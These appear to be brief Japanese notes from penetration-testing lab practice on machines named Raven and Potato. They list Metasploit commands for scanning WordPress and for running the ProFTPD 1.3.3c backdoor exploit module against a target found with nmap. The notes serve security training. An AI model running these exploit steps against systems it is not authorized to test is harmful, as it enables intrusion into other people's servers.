### Ravenを起動する
- `use auxiliary/scanner/http/wordpress_scanner`
- または左の数字でもいい
  - `use 40` 
- `show options`で開いてるとこを埋める
- setにrhosts,targeturiは埋める
  - targeturiはだいたい`/wordpress` 
- `run`

### Potatoを起動
- nmapでProfptdが起動しているのがわかる。このサービスにMetasploit攻撃をする 
```
msfconsole
search proftpd backdoor
use exploit/unix/ftp/proftpd_133c_backdoor
show options
set rhosts ターゲットのIP
set rport ターゲットのport
run
```
